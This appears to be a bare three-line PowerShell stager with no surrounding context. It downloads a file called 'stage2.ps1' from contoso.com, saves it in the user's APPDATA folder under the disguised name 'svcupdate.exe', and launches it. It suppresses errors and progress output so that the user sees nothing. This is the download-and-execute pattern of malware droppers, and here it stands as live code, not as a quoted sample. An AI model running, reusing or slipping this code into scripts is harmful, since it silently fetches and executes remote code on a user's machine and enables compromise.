
Start-BitsTransfer -Source "https://contoso.com/stage2.ps1" -Destination "$env:APPDATA\svcupdate.exe" -ErrorAction SilentlyContinue
Start-Process -FilePath "$env:APPDATA\svcupdate.exe" -ErrorAction SilentlyContinue
$ProgressPreference = "SilentlyContinue"
